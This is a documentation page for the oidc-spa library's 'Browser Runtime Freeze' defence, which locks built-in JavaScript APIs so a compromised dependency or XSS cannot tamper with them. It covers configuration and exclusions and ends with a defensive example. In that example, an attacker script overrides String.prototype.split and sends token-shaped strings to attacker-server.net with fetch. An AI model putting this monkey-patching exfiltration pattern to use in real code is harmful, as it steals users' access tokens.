---
description: Ensuring the integrity of the Browser Runtime Environement.
icon: igloo
---

# Browser Runtime Freeze

{% hint style="danger" %}
Still under construction
{% endhint %}

This is maybe the most important security defence as it's a prerequisite to ensure the other measures are actually effective.

It consist in ensuring the integrity of the Browser environement to make sure that an attaker cannot alterate the behavior of the core javascript language feature to exfiltrate tokens.

## Enabing the Defence

{% tabs %}
{% tab title="Vite Plugin" %}
<pre class="language-typescript" data-title="vite.config.ts"><code class="lang-typescript">import { defineConfig } from "vite";
import { oidcSpa } from "oidc-spa/vite-plugin";

export default defineConfig({
    plugins: [
        // ...
        oidcSpa({
            // ...
<strong>            browserRuntimeFreeze: {
</strong><strong>                enabled: true,
</strong><strong>                // exclude: ["Promise", "fetch", "XMLHttpRequest"]
</strong><strong>            }
</strong>        })
    ]
});
</code></pre>
{% endtab %}

{% tab title="Manual" %}
Note this defence is only truly efficient if oidcEarlyInit is the first code that runs in the environement, even before any other code has been evaluated. If you're calling `oidcEarlyInit` in **oidc.ts** instead of the entrypoint, know that by the time the environement is hardened it might already have been compromized.

<pre class="language-typescript" data-title="src/main.ts"><code class="lang-typescript">import { oidcEarlyInit } from "oidc-spa/entrypoint";

const { shouldLoadApp } = oidcEarlyInit({
    // ...
<strong>    browserRuntimeFreeze: {
</strong><strong>        enabled: true,
</strong><strong>        // exclude: ["Promise", "fetch", "XMLHttpRequest"]
</strong><strong>    }
</strong>});

if (shouldLoadApp) {
    import("./main.lazy");
}
</code></pre>
{% endtab %}
{% endtabs %}

## browserRuntimeFreeze.exclude

Unfortunately there is a high likelyhood that your app will refuse to start after you've enabled browserRuntimeFreeze. &#x20;

You might be faced by an exception like this:

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Here we can see that it's [Zone.js](https://www.npmjs.com/package/zone.js) that is attempting to overwrite the default implementation of winow.fetch. Other libraries, typically telemetry libraries like [@microsoft/applicationinsights-react-js](https://www.npmjs.com/package/@microsoft/applicationinsights-react-js) will produce the same error.

Here you have two option:

* 1\) Evaluate if you really need the library that is monkey patching. ([For example, can't you go Zoneless?](#user-content-fn-1)[^1])
* 2\) Add an exception for a specific API, by adding "fetch" to the exclude array you're telling oidc-spa to allow alteration of fetch.

**How much is my security posture degraded by adding exclusion?**

Unintuitively, excluding fetch and XMLHttpRequest is **not that bad**. Those are the first API that an attacker will try to instrument but [DPoP](dpop.md) and/or [Token Substitution](token-substitution.md) will make those vectors harmless.

The good news is that the APIs that are more critical to remain unalterated like `Function`, `String` or `JSON` are virtually never instrumented legitimely by libraries and shouldn't cause problem.  &#x20;

## Understanding What This Protects Against

In JavaScript, prety much any builtin APIs can be alterated at runtime. &#x20;

Let's consider this attack: &#x20;

```javascript
// Attacker's code:

const split_original = String.prototype.split;

String.prototype.split = function (...args) {

    if( this.match(/^[\w-]+\.[\w-]+\.[\w-]+$/) ){
        fetch(`https://attacker-server.net?likelyAccessToken=${this}`);
    }

    return split_original.apply(this, args);
    
}

// Legitimate code run internally:

// Just like that, the token has been leaked.
const [header, payload, signature ] = accessToken.split(".");
```

The purpose of browserRuntimeFreeze is precisely to prevent this.&#x20;

To make sure that when you call .split() or fetch() or promise.then() you're actually calling the real browther builtin and not a mokey patched version of it that would have been set by a compromized dependency you're using or an XSS attack.

With browserRuntimeFreeze enabled. Trying to do String.prototype.split = ()=>{} will throw a runtime exception. &#x20;

[^1]: Note specific to Angular project and Zode.js: You can also move the import of "zone.js" in your main.js file, so the alteration happen before oidc-spa lock down the environement. This will prevent you from having to exclude anything.
